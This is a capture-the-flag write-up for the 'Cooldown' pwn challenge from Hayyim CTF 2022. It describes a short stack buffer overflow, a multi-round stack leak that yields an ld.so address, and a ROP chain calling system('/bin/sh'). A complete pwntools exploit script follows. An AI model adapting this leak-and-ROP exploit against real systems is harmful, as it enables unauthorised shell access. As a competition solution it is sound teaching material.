#### **Cooldown,**


"the return"

as its name indicates (or not?) Cooldown was the successor of warmup challenge from Hayyim CTF 2022.

Cooldown only difference with warmup, is that this time we have only a buffer overflow of 0x60 bytes

as you can see in the reverse:

![IDA Reverse](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/cooldown/pics/reverse.png)

the smaller size of the buffer overflow, leaves us only 5 ROP gadgets possible after the pop rbx.

Which is not enough to do the exploitation in the same way that for warmup challenge.

So we will change of strategy.

we will do our leak exfiltration in 10 rounds.. slowly by slowly advancing on stack, until we read a ld.so address left there by the "Spirits of Pwn"...

at each round, we will send a payload that looks like this:

```payload = p64(0)*6+p64(0x601018)+p64(exe.sym['write'])+p64(0x40053e)```

it basically call write function in plt, the filedescriptor will be 0 after the read call (stdin so)..

but it will work remotely, as in general the filedescriptor remotely is a socket, and writing to stdin will work remotely..(old trick)

And instead of returning at the beginning of the vuln function, we will return after the push rbx instruction,

like this at each round, we will advance on stack..

We do this until we read a ld.so address on stack, that we have seen on gdb...

Once we got our leak, we calculate libc base, that is mapper at a constant offset before ld.so.

then we send a small ROP that calls system('/bin/sh')

and we will get our precious flag...

here is the exploit code:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

exe = ELF('./Cooldown')
libc = ELF('./libc.so.6')

if args.REMOTE:
  host, port = "141.164.48.191", "10005"

if (args.REMOTE or args.DOCKER):
  p = remote(host,port)
else:
  p = process(exe.path)

# dumps ten times the stack, each time 8 bytes further on stack.. until we reach ld.so address on stack
count = 10
buff = ''

for i in range(count):
  payload = p64(0)*6+p64(0x601018)+p64(exe.sym['write'])+p64(0x40053e)
  p.sendafter('> ', payload)
  buff  = p.recv(0x60)
  print(hexdump(buff))

# get our ld.so leak & calculate libc base with it
ldso = u64(buff[0x48:0x50])
print('ldso leak = '+hex(ldso))
libc.address = ldso - 0x3f1000
print('libc base = '+hex(libc.address))

# do a simple system('/bin/sh')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
bin_sh = next(libc.search('/bin/sh'))
payload = p64(0)*6+p64(0x601018)+p64(pop_rdi)+p64(bin_sh)+p64(libc.symbols['system'])
p.sendafter('> ', payload)

p.sendline('id;cat flag*')
p.interactive()
```

and off course, see it in action.. :)

![we got a shell](https://github.com/nobodyisnobody/write-ups/raw/main/Hayyim.CTF.2022/pwn/cooldown/pics/gotshell.gif)

and that's all !!

*nobodyisnobody still pwning things*   (until the world ends..)
